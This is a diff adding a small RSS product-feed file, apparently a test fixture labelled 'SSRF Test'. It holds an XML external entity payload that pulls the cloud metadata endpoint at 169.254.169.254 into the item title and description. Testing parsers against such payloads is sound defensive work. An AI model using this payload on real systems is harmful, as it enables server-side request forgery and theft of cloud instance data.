@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE rss [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/hostname">
+]>
+<rss version="2.0">
+  <channel>
+    <title>Test Store</title>
+    <link>http://example.com</link>
+    <description>SSRF Test</description>
+    <item>
+      <title>&xxe;</title>
+      <description>&xxe;</description>
+      <g:id xmlns:g="http://base.google.com/ns/1.0">12345</g:id>
+    </item>
+  </channel>
+</rss>
